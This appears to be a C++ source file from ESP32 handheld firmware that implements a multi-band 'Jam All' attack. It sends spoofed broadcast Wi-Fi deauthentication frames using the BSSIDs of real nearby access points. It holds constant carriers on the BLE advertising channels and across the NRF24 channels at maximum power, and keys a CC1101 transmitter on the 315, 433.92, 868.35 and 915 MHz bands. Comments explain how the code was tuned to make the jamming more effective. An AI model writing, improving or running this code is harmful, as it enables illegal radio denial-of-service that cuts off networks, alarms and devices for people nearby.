#include "jam_all.h"
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

#if defined(USE_NRF24_VIA_SPI)
#include "modules/NRF24/nrf_common.h"
#endif

#if defined(USE_CC1101_VIA_SPI)
#include "modules/rf/rf_utils.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#endif


static uint8_t deauth_frame[] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

static void randomize_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
}

static bool mac_is_zero(const uint8_t *mac) {
    for (int i = 0; i < 6; i++) if (mac[i] != 0) return false;
    return true;
}

// Honest per-band counters: only incremented on a confirmed TX.
uint32_t jam_wifi_sent = 0;
uint32_t jam_ble_sent = 0;
uint32_t jam_subghz_sent = 0;
uint32_t jam_nrf24_sent = 0;

static void wifi_jam_cycle(void) {
    static uint8_t channel = 1;
    static uint8_t ap_bssid[6] = {0};
    static unsigned long last_scan = 0;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    // Pull a real AP BSSID from a scan every few seconds so the deauth frames
    // actually match a network clients are associated with. Random BSSIDs are
    // mostly ignored. Fall back to broadcast if no AP is known yet.
    if (mac_is_zero(ap_bssid) || (millis() - last_scan) > 5000) {
        last_scan = millis();
        int n = WiFi.scanNetworks(false, false);
        if (n > 0) {
            int pick = random(n);
            uint8_t *b = WiFi.BSSID(pick);
            if (b) memcpy(ap_bssid, b, 6);
        }
        WiFi.scanDelete();
    }

    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t src[6];
    if (!mac_is_zero(ap_bssid)) {
        memcpy(src, ap_bssid, 6);
    } else {
        for (int i = 0; i < 6; i++) src[i] = 0xFF;
    }

    // Broadcast deauth: dest=FF:FF:FF:FF:FF:FF, src/bssid = real AP (or broadcast).
    memcpy(deauth_frame + 4, bcast, 6);
    memcpy(deauth_frame + 10, src, 6);
    memcpy(deauth_frame + 16, src, 6);

    for (int i = 0; i < 5; i++) {
        deauth_frame[24] = random(1, 10);  // sane reason codes 1-9
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (err == ESP_OK) jam_wifi_sent++;
    }

    // Cap at channel 13. Channel 14 is Japan-only and setChannel silently
    // fails on most regional firmware, stalling the hop cycle.
    channel = (channel % 13) + 1;
}


static void ble_jam_cycle(void) {
#if defined(USE_NRF24_VIA_SPI)
    static uint8_t bleChannel = 0;
    static const uint8_t bleAdvChannels[] = {2, 26, 80};
    NRFradio.stopConstCarrier();
    NRFradio.startConstCarrier(RF24_PA_MAX, bleAdvChannels[bleChannel]);
    bleChannel = (bleChannel + 1) % 3;
    jam_ble_sent++;
#endif
}


static void subghz_jam_cycle(void) {
#if defined(USE_CC1101_VIA_SPI)
    // Hold each frequency for a meaningful stretch instead of a 500us blip.
    // A real jammer needs dwell time per band; the old code entered TX for
    // half a millisecond then looped back and reset the radio state machine
    // every cycle, so the duty cycle was near zero.
    static const float freqs[] = {315.0, 433.92, 868.35, 915.0};
    static int freqIdx = 0;
    static unsigned long lastHop = 0;

    if (millis() - lastHop > 250) {
        lastHop = millis();
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freqs[freqIdx]);
        ELECHOUSE_cc1101.SetTx();
        freqIdx = (freqIdx + 1) % 4;
        jam_subghz_sent++;
    }
#endif
}


static void nrf24_jam_cycle(void) {
#if defined(USE_NRF24_VIA_SPI)
    static uint8_t nrfChannel = 0;
    NRFradio.stopConstCarrier();
    NRFradio.startConstCarrier(RF24_PA_MAX, nrfChannel);
    nrfChannel = (nrfChannel + 2) % 126;
    jam_nrf24_sent++;
#endif
}


void jamall_init(JamAllState &state) {
    state.bands[JAM_WIFI_24] = {"WiFi 2.4", true, true, false, 0};
    state.bands[JAM_BLE] = {"BLE", true, true, false, 0};

#if defined(USE_CC1101_VIA_SPI)
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", true, true, false, 0};
#else
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", false, false, false, 0};
#endif

#if defined(USE_NRF24_VIA_SPI)
    state.bands[JAM_NRF24] = {"NRF24", true, true, false, 0};
#else
    state.bands[JAM_NRF24] = {"NRF24", false, false, false, 0};
#endif

    state.startTime = 0;
    state.timeout = 5 * 60 * 1000;
    state.selectedBand = 0;
    state.running = false;
}

void jamall_start_band(JamAllState &state, JamBand band) {
    if (!state.bands[band].available) return;

    // BLE and NRF24 share the single NRF24L01 radio, so they cannot run
    // together. Enabling one disables the other to stop them fighting over
    // startConstCarrier/stopConstCarrier every cycle.
#if defined(USE_NRF24_VIA_SPI)
    if (band == JAM_BLE) {
        if (state.bands[JAM_NRF24].active) jamall_stop_band(state, JAM_NRF24);
        state.bands[JAM_NRF24].enabled = false;
    } else if (band == JAM_NRF24) {
        if (state.bands[JAM_BLE].active) jamall_stop_band(state, JAM_BLE);
        state.bands[JAM_BLE].enabled = false;
    }
#endif

    state.bands[band].active = true;
    state.bands[band].enabled = true;
}

void jamall_stop_band(JamAllState &state, JamBand band) {
    state.bands[band].active = false;
}

void jamall_start_all(JamAllState &state) {

    // Reset honest counters for this run.
    jam_wifi_sent = jam_ble_sent = jam_subghz_sent = jam_nrf24_sent = 0;

    // BLE and NRF24 share one radio. If both are enabled, keep BLE and drop
    // NRF24 so the radio is not yanked between two jam cycles every tick.
#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_BLE].enabled && state.bands[JAM_NRF24].enabled) {
        state.bands[JAM_NRF24].enabled = false;
        state.bands[JAM_NRF24].active = false;
    }
#endif

    if (state.bands[JAM_WIFI_24].enabled && state.bands[JAM_WIFI_24].available) {
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        state.bands[JAM_WIFI_24].active = true;
    }

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_BLE].enabled && state.bands[JAM_BLE].available) {
        if (nrf_start(NRF_MODE_SPI)) {
            NRFradio.stopConstCarrier();
            state.bands[JAM_BLE].active = true;
        }
    }
#endif

#if defined(USE_CC1101_VIA_SPI)
    if (state.bands[JAM_SUBGHZ].enabled && state.bands[JAM_SUBGHZ].available) {
        if (initRfModule("tx", 433.92)) {
            state.bands[JAM_SUBGHZ].active = true;
        }
    }
#endif

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_NRF24].enabled && state.bands[JAM_NRF24].available) {
        if (nrf_start(NRF_MODE_SPI)) {
            NRFradio.stopConstCarrier();
            state.bands[JAM_NRF24].active = true;
        }
    }
#endif

    state.startTime = millis();
    state.running = true;
}

void jamall_stop_all(JamAllState &state) {
    if (state.bands[JAM_WIFI_24].active) {
        esp_wifi_set_promiscuous(false);
    }

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_BLE].active || state.bands[JAM_NRF24].active) {
        NRFradio.stopConstCarrier();
        NRFradio.flush_tx();
        NRFradio.powerDown();
    }
#endif

#if defined(USE_CC1101_VIA_SPI)
    if (state.bands[JAM_SUBGHZ].active) {
        deinitRfModule();
    }
#endif

    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        state.bands[i].active = false;
        state.bands[i].level = 0;
    }

    state.running = false;
}

void jamall_update(JamAllState &state) {
    if (!state.running) return;


    if (state.timeout > 0 && (millis() - state.startTime) > state.timeout) {
        jamall_stop_all(state);
        return;
    }


    // Activity level is derived from whether frames actually went out this
    // tick, not a random number. Each band decays so the bar settles when the
    // radio stops delivering.
    auto pulse = [](uint8_t &lvl, uint32_t before, uint32_t after) {
        if (after > before) lvl = 10;
        else if (lvl > 0) lvl--;
    };

    if (state.bands[JAM_WIFI_24].active) {
        uint32_t b = jam_wifi_sent;
        wifi_jam_cycle();
        pulse(state.bands[JAM_WIFI_24].level, b, jam_wifi_sent);
    }

    if (state.bands[JAM_BLE].active) {
        uint32_t b = jam_ble_sent;
        ble_jam_cycle();
        pulse(state.bands[JAM_BLE].level, b, jam_ble_sent);
    }

    if (state.bands[JAM_SUBGHZ].active) {
        uint32_t b = jam_subghz_sent;
        subghz_jam_cycle();
        pulse(state.bands[JAM_SUBGHZ].level, b, jam_subghz_sent);
    }

    if (state.bands[JAM_NRF24].active) {
        uint32_t b = jam_nrf24_sent;
        nrf24_jam_cycle();
        pulse(state.bands[JAM_NRF24].level, b, jam_nrf24_sent);
    }

    esp_task_wdt_reset();
}


void jamall_draw_gui(JamAllState &state) {

    tft.fillRect(0, 27, tftWidth, tftHeight - 27, bruceConfig.bgColor);

    int padX = 10;
    int startY = 32;
    int rowHeight = 28;
    int barWidth = 100;
    int barHeight = 10;
    int barX = tftWidth - barWidth - padX - 60;


    unsigned long elapsed = state.running ? (millis() - state.startTime) / 1000 : 0;
    char timeStr[16];
    snprintf(timeStr, sizeof(timeStr), "%02lu:%02lu", elapsed / 60, elapsed % 60);

    tft.setTextSize(FP);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawString("JAM ALL", padX, startY, 1);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawRightString(timeStr, tftWidth - padX, startY, 1);

    // Honest total of frames that actually left the radio across all bands.
    uint32_t total = jam_wifi_sent + jam_ble_sent + jam_subghz_sent + jam_nrf24_sent;
    tft.setTextColor(tft.color565(120, 120, 120), bruceConfig.bgColor);
    char sentStr[24];
    snprintf(sentStr, sizeof(sentStr), "sent: %lu", (unsigned long)total);
    tft.drawCentreString(sentStr, tftWidth / 2, startY, 1);

    startY += 18;


    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        int y = startY + (i * rowHeight);
        bool selected = (i == state.selectedBand);
        uint16_t textColor = bruceConfig.priColor;
        uint16_t bgColor = bruceConfig.bgColor;


        if (selected) {
            tft.fillRect(padX - 2, y - 2, tftWidth - 2 * padX + 4, rowHeight - 4,
                         tft.color565(30, 30, 50));
            bgColor = tft.color565(30, 30, 50);
        }


        if (!state.bands[i].available) {
            textColor = tft.color565(80, 80, 80);
        }
        tft.setTextColor(textColor, bgColor);
        tft.drawString(state.bands[i].name, padX + 4, y + 4, 1);


        int bx = barX;
        int by = y + 4;


        tft.fillRect(bx, by, barWidth, barHeight, tft.color565(40, 40, 40));


        if (state.bands[i].active) {
            int fillWidth = (barWidth * state.bands[i].level) / 10;
            tft.fillRect(bx, by, fillWidth, barHeight, TFT_RED);
        } else if (state.bands[i].enabled && state.bands[i].available) {
            tft.fillRect(bx, by, barWidth / 5, barHeight, TFT_DARKGREEN);
        }


        int dotX = tftWidth - padX - 20;
        int dotY = y + 6;
        if (state.bands[i].active) {
            tft.fillCircle(dotX, dotY + 2, 4, TFT_RED);
            tft.setTextColor(TFT_RED, bgColor);
            tft.drawString("ON", dotX + 8, y + 4, 1);
        } else if (!state.bands[i].available) {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(80, 80, 80));
            tft.setTextColor(tft.color565(80, 80, 80), bgColor);
            tft.drawString("N/A", dotX + 8, y + 4, 1);
        } else {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(50, 50, 50));
            tft.setTextColor(tft.color565(120, 120, 120), bgColor);
            tft.drawString("OFF", dotX + 8, y + 4, 1);
        }
    }


    int bottomY = tftHeight - 20;
    tft.fillRect(0, bottomY - 2, tftWidth, 22, tft.color565(20, 20, 20));
    tft.setTextSize(FP);

    if (state.running) {
        tft.setTextColor(TFT_RED, tft.color565(20, 20, 20));
        tft.drawCentreString(String("[PRESS] STOP ALL"), tftWidth / 2, bottomY + 2, 1);
    } else {
        tft.setTextColor(TFT_GREEN, tft.color565(20, 20, 20));
        tft.drawCentreString(String("[PRESS] START  [ROTATE] Select"), tftWidth / 2, bottomY + 2, 1);
    }
}


void arsenal_jam_all(void) {

    if (ESP.getFreeHeap() < 30000) {
        displayRedStripe("Low memory!", TFT_WHITE, TFT_RED);
        delay(1500);
        return;
    }

    JamAllState state;
    jamall_init(state);

    drawMainBorderWithTitle("Jam All");
    jamall_draw_gui(state);

    unsigned long lastDraw = 0;
    const unsigned long drawInterval = 200;

    while (true) {

        if (check(EscPress)) {
            if (state.running) {
                jamall_stop_all(state);
            }
            returnToMenu = true;
            break;
        }

        if (check(SelPress)) {
            if (state.running) {

                jamall_stop_all(state);
            } else {

                jamall_start_all(state);
            }
        }


        if (check(NextPress) || check(DownPress)) {
            state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;

            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;
                attempts++;
            }
        }

        if (check(PrevPress) || check(UpPress)) {
            state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
                attempts++;
            }
        }


        if (check(LongPress)) {
            if (state.bands[state.selectedBand].available) {
                state.bands[state.selectedBand].enabled = !state.bands[state.selectedBand].enabled;
                if (!state.bands[state.selectedBand].enabled && state.bands[state.selectedBand].active) {
                    jamall_stop_band(state, (JamBand)state.selectedBand);
                }
            }
        }


        jamall_update(state);


        if (millis() - lastDraw > drawInterval) {
            jamall_draw_gui(state);
            lastDraw = millis();
        }

        delay(10);
    }


    jamall_stop_all(state);
    esp_wifi_set_promiscuous(false);
}
